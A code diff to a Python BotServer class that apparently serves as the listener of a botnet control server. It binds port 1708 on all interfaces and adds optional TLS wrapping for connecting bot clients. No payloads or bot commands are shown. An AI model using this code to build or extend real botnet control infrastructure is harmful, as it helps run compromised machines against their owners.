@@ -2,6 +2,8 @@ from threading import Thread
 from distutils.version import LooseVersion
 import json
 import os
+import socket
+import ssl
 
 try:
     from server import formatsock, server
@@ -16,17 +18,35 @@ except:
 MIN_CLIENT_VERSION = client.__version__
 
 class BotServer(Thread):
-    def __init__(self, tcpsock, botnet, socketio):
+    HOST = '0.0.0.0'
+    PORT = 1708
+
+    def __init__(self, botnet, socketio, certfile=None, keyfile=None):
         Thread.__init__(self)
-        self.tcpsock = tcpsock
+        self.tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.tcpsock.bind((BotServer.HOST, BotServer.PORT))
+
         self.botnet = botnet
         self.socketio = socketio
         self.clientversion = LooseVersion(MIN_CLIENT_VERSION)
 
+        self.ssl = certfile and keyfile
+        self.certfile = certfile
+        self.keyfile = keyfile
+
     def run(self):
+        self.tcpsock.listen(5)
         while True:
-            self.tcpsock.listen(5)
-            (clientsock, (ip, port)) = self.tcpsock.accept()
+            clientsock, (ip, port) = self.tcpsock.accept()
+            clientsock.send(b'\x01' if self.ssl else b'\x00')
+            if self.ssl:
+                clientsock = ssl.wrap_socket(
+                    clientsock,
+                    server_side=True,
+                    certfile=self.certfile,
+                    keyfile=self.keyfile
+                )
             clientformatsock = formatsock.FormatSocket(clientsock)
             print("[*] Accepting connection")
             msgbytes = clientformatsock.recv()
